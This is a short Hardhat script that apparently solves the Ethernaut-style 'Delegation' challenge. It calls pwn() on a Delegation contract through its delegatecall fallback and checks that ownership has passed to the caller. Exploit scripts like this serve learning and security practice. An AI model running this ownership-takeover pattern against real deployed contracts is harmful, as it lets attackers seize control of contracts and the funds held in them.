const { ethers } = require("hardhat");

async function main() {
  const [signer] = await ethers.getSigners();
  console.log("address being used", signer.address);
  // Replace this address with the address of your already deployed Delegation contract
  const delegationAddress = "0x4aF3816cc8C79a163458e74bab65C0aF2E53B8e1";

  console.log("Creating contract instance...");
  const delegation = await ethers.getContractAt("Delegate", delegationAddress);
  console.log("Owner:", await delegation.owner());

  console.log("Calling pwn() function on Delegate via Delegation fallback function...");
  const pwnTx = await delegation.pwn();
  await pwnTx.wait();
  console.log("pwn() function called!");

  console.log("Owner:", await delegation.owner());
  console.log("Done!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
